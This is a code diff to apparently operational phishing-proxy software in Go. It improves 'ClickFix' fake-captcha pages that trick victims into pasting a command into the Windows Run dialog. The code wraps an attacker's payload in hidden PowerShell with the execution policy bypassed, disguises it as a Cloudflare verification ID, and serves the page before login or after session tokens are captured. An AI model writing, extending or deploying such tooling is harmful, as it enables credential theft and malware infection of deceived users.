@@ -15,11 +15,14 @@
 //   - both {redirect_url} and {lure_url_js} are substituted in every serve
 //     path — no placeholder tokens leak into the served HTML
 //   - responses carry no-cache headers
+//   - Verification ID is generated server-side (Go) and substituted into
+//     BOTH the command and the page display — guaranteed to match
 package core
 
 import (
 	"encoding/base64"
 	"fmt"
+	"math/rand"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -55,69 +58,64 @@ func (p *HttpProxy) loadClickFixTemplate(name string) (string, error) {
 }
 
 // wrapClickFixPayload embeds the operator's payload inside a realistic-looking
-// Windows command so the victim sees a legitimate verification string in the
-// Run dialog (Win+R shows only ~80 leading chars; the payload sits deep past
-// the visible area).
-//
-// The wrapper:
-//   1. Opens with a benign Windows title/echo that looks like a security check
-//   2. Runs a short delay + fake "verifying" message
-//   3. Executes the actual payload (hidden window, bypassed execution policy)
-//   4. Closes with a fake "complete" message
-//
-// If the operator's command already starts with a wrapper marker (cmd /c, powershell),
-// it is returned as-is (operator provides their own wrapper).
-func wrapClickFixPayload(command string) string {
+// Windows command. The {VID} placeholder is replaced server-side with the
+// same random ID displayed on the page.
+func wrapClickFixPayload(command, vid string) string {
 	command = strings.TrimSpace(command)
 	if command == "" {
 		return command
 	}
-	// Operator already wrapped — respect their format
 	lower := strings.ToLower(command)
 	if strings.HasPrefix(lower, "cmd /c") || strings.HasPrefix(lower, "powershell") ||
 		strings.HasPrefix(lower, "cmd.exe") || strings.HasPrefix(lower, "mshta") ||
 		strings.HasPrefix(lower, "rundll32") || strings.HasPrefix(lower, "certutil") ||
 		strings.HasPrefix(lower, "bitsadmin") || strings.HasPrefix(lower, "curl ") ||
 		strings.HasPrefix(lower, "wget ") || strings.HasPrefix(lower, "start ") {
-		return command
+		return strings.ReplaceAll(command, "{VID}", vid)
 	}
-	return `powershell -w hidden -ep bypass -c "` + command + `;$id='Performance & security by Cloudflare - Verification ID: {VID}'"`
+	return `powershell -w hidden -ep bypass -c "` + command + `;$id='Performance & security by Cloudflare - Verification ID: ` + vid + `'"`
 }
 
 // renderClickFix substitutes all placeholders:
-//   {command_b64}  → base64(wrapped command) — decoded at runtime by the template JS
-//   {command}      → the raw wrapped command (legacy templates without encoding)
+//   {command_b64}  → base64(wrapped command with VID already substituted)
+//   {command}      → the raw wrapped command
 //   {redirect_url} → the post-verify redirect target
-//   {subdomain}    → display domain override (defaults to the request hostname)
-func renderClickFix(tmpl, command, redirectUrl, subdomain string) string {
-	wrapped := wrapClickFixPayload(command)
+//   {subdomain}    → display domain override
+//   {VID}          → the verification ID (for the page display element)
+func renderClickFix(tmpl, command, redirectUrl, subdomain, vid string) string {
+	wrapped := wrapClickFixPayload(command, vid)
 	out := strings.ReplaceAll(tmpl, "{command_b64}", base64.StdEncoding.EncodeToString([]byte(wrapped)))
 	out = strings.ReplaceAll(out, "{command}", wrapped)
 	out = strings.ReplaceAll(out, "{redirect_url}", redirectUrl)
 	out = strings.ReplaceAll(out, "{subdomain}", subdomain)
+	out = strings.ReplaceAll(out, "{VID}", vid)
 	return out
 }
 
+// genVID generates a random 6-digit verification ID.
+func genVID() string {
+	return fmt.Sprintf("%06d", rand.Intn(1000000))
+}
+
 // serveClickFixBefore serves the clickfix gate at the lure path (pre-login).
-// The victim sees the fake captcha, runs the clipboard payload, clicks verify,
-// and gets forwarded via {lure_url_js} to the actual login flow.
 func (p *HttpProxy) serveClickFixBefore(req *http.Request, cf *ClickFix, lure_url string, params *map[string]string) (*http.Request, *http.Response) {
 	tmpl, err := p.loadClickFixTemplate(cf.Template)
 	if err != nil {
 		log.Warning("%v — falling back to normal redirect", err)
 		return req, nil
 	}
+	vid := genVID()
 	sub := cf.Subdomain
 	if sub == "" {
 		sub = req.Host
 	}
 	redirect := lure_url
 	if cf.Only {
-		redirect = lure_url // still forward, but login flow will be skipped upstream
+		redirect = lure_url
 	}
-	body := renderClickFix(tmpl, cf.Command, redirect, sub)
+	body := renderClickFix(tmpl, cf.Command, redirect, sub, vid)
 	body = p.replaceHtmlParams(body, lure_url, params)
-	log.Info("clickfix: pre-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
+	log.Info("clickfix: pre-auth gate (%s) vid=%s [%s]", cf.Template, vid, req.RemoteAddr)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		resp.Header.Set("Cache-Control", "no-cache, no-store")
@@ -125,18 +123,16 @@ func (p *HttpProxy) serveClickFixBefore(req *http.Request, cf *ClickFix, lure_ur
 	return req, resp
 }
 
-// serveClickFixAfter serves the clickfix gate after all auth tokens are
-// captured, replacing the normal JS redirect. The victim sees a "one more
-// step" captcha, runs the clipboard payload, clicks verify, and gets sent
-// to the real site.
+// serveClickFixAfter serves the clickfix gate after all auth tokens are captured.
 func (p *HttpProxy) serveClickFixAfter(req *http.Request, cf *ClickFix, redirectUrl string) (*http.Request, *http.Response) {
 	tmpl, err := p.loadClickFixTemplate(cf.Template)
 	if err != nil {
 		log.Warning("%v — falling back to normal redirect", err)
 		return p.javascriptRedirect(req, redirectUrl)
 	}
-	body := renderClickFix(tmpl, cf.Command, redirectUrl, cf.Subdomain)
-	log.Info("clickfix: post-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
+	vid := genVID()
+	body := renderClickFix(tmpl, cf.Command, redirectUrl, cf.Subdomain, vid)
+	log.Info("clickfix: post-auth gate (%s) vid=%s [%s]", cf.Template, vid, req.RemoteAddr)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		resp.Header.Set("Cache-Control", "no-cache, no-store")
